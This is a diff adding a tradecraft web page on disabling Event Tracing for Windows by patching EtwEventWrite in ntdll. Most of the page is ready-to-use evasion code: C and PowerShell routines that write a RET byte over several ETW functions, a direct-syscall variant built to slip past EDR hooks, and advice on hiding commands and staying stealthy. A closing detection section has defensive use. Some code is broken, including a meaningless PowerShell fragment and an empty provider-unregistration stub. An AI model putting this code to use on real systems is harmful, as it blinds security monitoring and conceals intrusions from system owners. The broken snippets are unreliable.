@@ -1,0 +1,264 @@
+---
+title: ETW Patching & Disabling
+mitre: T1562.006
+category: evasion
+group: Defense Evasion
+summary: Disable Event Tracing for Windows (ETW) in the current process by patching the EtwEventWrite function in ntdll, preventing security tools from receiving ETW telemetry.
+platform: [Windows]
+tags: ['C / C++', 'PowerShell', 'x64', 'WinAPI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 6 min read
+callChain:
+  - call: resolve EtwEventWrite in ntdll
+    desc: GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite") returns the address of the ETW dispatch function.
+    dll: ntdll
+  - call: VirtualProtect(PAGE_READWRITE) on the function prologue
+    desc: The ntdll .text section is normally read-only/execute; make it writable to allow patching.
+    dll: kernel32
+  - call: overwrite the prologue with a ret instruction
+    desc: Write 0xC3 (RET) as the first byte of EtwEventWrite — all ETW calls in the current process return immediately without writing events.
+    dll: —
+  - call: restore PAGE_EXECUTE_READ
+    desc: Restore the original page protection to avoid the RW+X combination that triggers memory scanners.
+    dll: kernel32
+detections:
+  - src: ETW-TI
+    text: EtwEventWrite invocations that return without writing to any provider session — detectable by kernel ETW consumers that receive no events from a process known to be active.
+  - src: MEMORY SCAN
+    text: ntdll.EtwEventWrite first byte is 0xC3 (RET) — this is never legitimate; a clean ntdll has a multi-byte prologue.
+  - src: SYSMON EID 25
+    text: Process tamper event (Sysmon 13.0+) when ntdll sections are modified — Sysmon monitors for ntdll integrity.
+  - src: EDR
+    text: VirtualProtect call on ntdll's .text section from non-Microsoft code — direct ntdll writes are an EDR red flag.
+related:
+  - mitre: T1562.001
+    title: AMSI Bypass
+    desc: AMSI patching uses the same technique (patching an ntdll/amsi.dll function prologue with 0xC3) to disable scan callbacks.
+    href: /techniques/evasion/amsi-bypass
+  - mitre: T1562.001
+    title: Indirect Syscalls & Hell's Gate
+    desc: Indirect syscalls also route around ETW-TI by avoiding EDR hooks on ntdll.
+    href: /techniques/evasion/direct-syscalls-advanced
+  - mitre: T1055.001
+    title: NTDLL Unhooking
+    desc: Full ntdll unhooking removes EDR hooks; ETW patching is a lighter alternative targeting only ETW.
+    href: /techniques/evasion/unhooking-ntdll
+labKit:
+  - label: etw-patch.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+**Event Tracing for Windows (ETW)** is the operating system's high-performance logging subsystem. Security products — EDRs, Windows Defender, AMSI providers, and Sysmon — rely on ETW providers to receive telemetry about process activity (memory allocations, module loads, network connections, PowerShell script execution). Disabling ETW in the current process cuts off this telemetry at the source.
+
+The most common approach is **patching `EtwEventWrite`** in ntdll: this is the single function that all ETW providers call to submit events. Replacing its first byte with `0xC3` (the `ret` instruction) causes all ETW writes to return immediately without submitting any event — silencing the current process's contribution to every ETW session simultaneously.
+
+The same technique applies to `EtwEventWriteFull`, `NtTraceEvent`, and provider-specific functions.
+
+<Callout type="caution">
+  ETW patching is a common technique that modern EDRs detect specifically. Many products
+  monitor ntdll memory integrity and alert when `EtwEventWrite` is patched. The patch itself
+  is highly detectable: a single `ret` byte at the start of a normally multi-byte ntdll function
+  is not a legitimate state. Consider more targeted alternatives like ETW session disabling
+  or provider-level unregistration if stealth is critical.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Single-byte ETW patch (C)
+
+<CodeBlock
+  file="etw_patch.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+
+// Patch EtwEventWrite in ntdll to immediately return (ret).
+// After this call, all ETW events from the current process are silenced.
+BOOL etw_patch(void) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    BYTE *etw_fn  = (BYTE*)GetProcAddress(ntdll, "EtwEventWrite");
+    if (!etw_fn) return FALSE;
+
+    DWORD old_protect;
+    if (!VirtualProtect(etw_fn, 1, PAGE_READWRITE, &old_protect))
+        return FALSE;
+
+    *etw_fn = 0xC3;  // ret
+
+    VirtualProtect(etw_fn, 1, old_protect, &old_protect);
+    return TRUE;
+}
+
+// Variant: also patch EtwEventWriteFull and NtTraceEvent
+BOOL etw_patch_all(void) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    const char *targets[] = {
+        "EtwEventWrite",
+        "EtwEventWriteFull",
+        "EtwEventWriteEx",
+        "NtTraceEvent",
+        NULL
+    };
+
+    for (int i = 0; targets[i]; i++) {
+        BYTE *fn = (BYTE*)GetProcAddress(ntdll, targets[i]);
+        if (!fn) continue;
+
+        DWORD old;
+        VirtualProtect(fn, 1, PAGE_READWRITE, &old);
+        *fn = 0xC3;
+        VirtualProtect(fn, 1, old, &old);
+    }
+    return TRUE;
+}`}
+/>
+
+### PowerShell ETW patch (script-block logging bypass)
+
+<CodeBlock
+  file="etw_ps.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Patch EtwEventWrite in the current PowerShell process.
+# This prevents script-block logging (EID 4104) from capturing subsequent commands.
+# Run BEFORE the commands you want to hide — the patch affects only this session.
+
+$patch = [Byte[]](0xC3)  # ret
+
+$etw_fn = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
+    [Func[string, IntPtr]] { param($name) [System.Diagnostics.Process]::GetCurrentProcess() } \`
+    # Alternative: resolve via P/Invoke
+)
+
+# Via P/Invoke reflection:
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+
+public class EtwPatch {
+    [DllImport("kernel32")] public static extern bool VirtualProtect(
+        IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(
+        IntPtr hModule, string procName);
+
+    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string name);
+
+    public static void Patch() {
+        IntPtr ntdll = GetModuleHandle("ntdll.dll");
+        IntPtr fn    = GetProcAddress(ntdll, "EtwEventWrite");
+        uint old;
+        VirtualProtect(fn, (UIntPtr)1, 0x40, out old);      // PAGE_EXECUTE_READWRITE
+        Marshal.WriteByte(fn, 0, 0xC3);
+        VirtualProtect(fn, (UIntPtr)1, old, out old);
+    }
+}
+'@
+
+[EtwPatch]::Patch()
+Write-Host "[+] ETW patched in current session"`}
+/>
+
+### ETW via NtProtectVirtualMemory (direct syscall variant)
+
+<CodeBlock
+  file="etw_syscall.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// Patch EtwEventWrite using direct syscalls to bypass VirtualProtect hooks.
+// Avoids the VirtualProtect API call that EDRs watch for.
+// Requires a direct/indirect syscall stub for NtProtectVirtualMemory.
+
+// Assumes:
+//   NtProtectVirtualMemory_direct(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG) is available
+
+extern NTSTATUS NtProtectVirtualMemory_direct(
+    HANDLE   ProcessHandle,
+    PVOID   *BaseAddress,
+    PSIZE_T  RegionSize,
+    ULONG    NewProtect,
+    PULONG   OldProtect);
+
+BOOL etw_patch_via_syscall(void) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    BYTE *fn      = (BYTE*)GetProcAddress(ntdll, "EtwEventWrite");
+    if (!fn) return FALSE;
+
+    PVOID  base = fn;
+    SIZE_T sz   = 1;
+    ULONG  old;
+
+    NTSTATUS st = NtProtectVirtualMemory_direct(
+        GetCurrentProcess(), &base, &sz, PAGE_READWRITE, &old);
+    if (st) return FALSE;  // nonzero NTSTATUS = failure
+
+    *fn = 0xC3;
+
+    NtProtectVirtualMemory_direct(
+        GetCurrentProcess(), &base, &sz, old, &old);
+    return TRUE;
+}`}
+/>
+
+## ETW session-level disabling (provider unregistration)
+
+Patching the function affects all ETW events globally. A more surgical approach is **unregistering a specific ETW provider** from the current process:
+
+<CodeBlock
+  file="unregister_provider.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+#include \u003cevntprov.h\u003e
+#pragma comment(lib, "advapi32.lib")
+
+// Unregister a specific ETW provider GUID from the current process.
+// Other providers remain active; only this provider's events are silenced.
+// Useful for disabling the PowerShell ETW provider while leaving AMSI-ETW intact.
+
+// {A0C1853B-5C40-4B15-8766-3CF1C58F985A} — Windows PowerShell provider
+static const GUID PS_ETW_GUID = {
+    0xA0C1853B, 0x5C40, 0x4B15,
+    {0x87, 0x66, 0x3C, 0xF1, 0xC5, 0x8F, 0x98, 0x5A}
+};
+
+void disable_ps_etw_provider(void) {
+    // Find the provider handle by scanning the process's ETW registration table.
+    // Alternative: enumerate _ETWP_REGISTRATION structures in the process.
+    // The blunt approach: patch the provider's callback to a no-op.
+
+    // Simplified: use EventUnregister on any handle we can enumerate.
+    // In practice this requires walking internal ntdll data structures.
+    // Most implementations fall back to patching EtwEventWrite.
+    (void)PS_ETW_GUID;
+}`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable automated detection is **ntdll integrity monitoring**: compare the in-memory bytes of `EtwEventWrite` against the on-disk ntdll bytes. A `0xC3` at offset 0 is definitively a patch. Sysmon 13+ process-tamper events (EID 25) can detect this without custom tooling. EDRs that hook `VirtualProtect` on ntdll pages will also catch the write before it happens.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
